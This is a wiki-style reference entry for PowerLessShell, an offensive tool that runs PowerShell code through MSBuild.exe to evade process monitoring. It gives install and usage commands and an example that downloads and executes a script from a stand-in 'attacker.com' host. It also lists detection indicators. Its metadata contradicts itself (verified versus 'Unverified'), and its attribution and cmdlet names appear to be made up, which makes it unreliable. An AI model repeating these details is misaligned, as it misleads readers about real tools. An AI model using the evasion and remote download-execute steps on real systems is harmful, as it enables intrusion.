---
id: 2792e454-567e-4d9f-a22e-f5794b62ed5c
type: tool
verified: true
created_at: '2019-08-28T21:17:34.097096+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - evasion
  - execution
  - powershell
  - msbuild
url: 'https://github.com/NetSPI/PowerLessShell'
commands:
  - '[[commands/generate-powershellless-payload]]'
  - '[[commands/execute-msbuild-payload]]'
validated: true
---

# PowerLessShell

**Status**: Unverified

## Overview

PowerLessShell is a PowerShell module designed to execute PowerShell scripts and commands remotely by leveraging MSBuild.exe as a proxy, without directly spawning powershell.exe. This technique helps evade detection mechanisms that monitor for PowerShell process creation, making it useful in red team operations for command and script execution in Windows environments.

## Description

PowerLessShell works by generating an MSBuild project file (.xml) that embeds the desired PowerShell code. When this project file is built using MSBuild.exe (a legitimate Microsoft development tool), it executes the embedded PowerShell logic inline during the build process. This approach falls under trusted developer utilities proxy execution and is particularly effective against endpoint detection rules focused on PowerShell binaries. It supports executing script blocks, running external scripts, and even downloading and executing payloads from remote locations.

## Features

- **Payload Generation**: Creates customizable MSBuild XML files containing PowerShell code for inline execution.
- **Evasion Capabilities**: Avoids direct PowerShell process spawning, reducing visibility in process monitoring tools.
- **Flexibility**: Supports script blocks, file paths, and encoded commands for various post-exploitation scenarios.
- **Integration**: Can be used standalone or integrated into larger attack chains for lateral movement or persistence.

## Installation

### Requirements

- PowerShell 3.0 or later (Windows environments).
- MSBuild.exe (included with Visual Studio or .NET Framework; typically available on Windows Server and developer machines).
- Git for cloning the repository.

### Install Commands

```bash
# Clone the repository from GitHub
mkdir C:\Tools
cd C:\Tools
git clone https://github.com/NetSPI/PowerLessShell.git

# Navigate to the directory and import the module (run in PowerShell)
cd PowerLessShell
Import-Module .\PowerLessShell.psm1
```

For air-gapped environments, download the ZIP from the GitHub releases and extract it manually.

## Basic Usage

```powershell
# Import the module
Import-Module .\PowerLessShell.psm1

# Generate a basic payload (see related commands for details)
New-PowerLessShellProject -ScriptBlock {Get-Process} -OutputFile payload.xml

# Execute the generated payload using MSBuild
& "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\MSBuild.exe" payload.xml
```

### Common Options

| Option | Description |
|--------|-------------|
| `-ScriptBlock` | PowerShell code to execute inline. |
| `-Path` | Path to an external PowerShell script file. |
| `-OutputFile` | Name of the generated MSBuild XML file. |
| `-Encode` | Base64-encode the payload for obfuscation. |
| `-Download` | URL to download and execute a script from. |

## Examples

### Example 1: Basic Usage

Generate and execute a simple command to list processes:

```powershell
# Generate payload
New-PowerLessShellProject -ScriptBlock {Get-Process | Out-File C:\temp\processes.txt} -OutputFile listproc.xml

# Execute
msbuild.exe listproc.xml /t:Build
```

This will run the PowerShell code during the MSBuild process and write output to a file without spawning powershell.exe.

### Example 2: Advanced Usage

Download and execute a remote script:

```powershell
New-PowerLessShellProject -Download "http://attacker.com/malicious.ps1" -OutputFile download.xml
msbuild.exe download.xml /t:Build
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[MSBuild]] MSBuild
- [[PowerShell]] PowerShell

### Tactics

- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Monitor for MSBuild.exe spawning child processes or network connections (unusual for build tools).
- Look for XML files with embedded PowerShell in temporary directories.
- Enable PowerShell logging (Module, ScriptBlock) to capture executed code even if not via powershell.exe.
- ETW logging for MSBuild events and command-line arguments containing Base64 or script-like content.
- File creation events for .xml files in staging areas with PowerShell keywords.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Empire]] (for PowerShell payload management)
- [[tools/Cobalt Strike]] (for advanced beacon execution)

## References

- Official GitHub Repository: https://github.com/NetSPI/PowerLessShell
- Blog Post: https://www.netspi.com/blog/entryid/2095-powershellless-powershell-without-powershell
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1127/001/
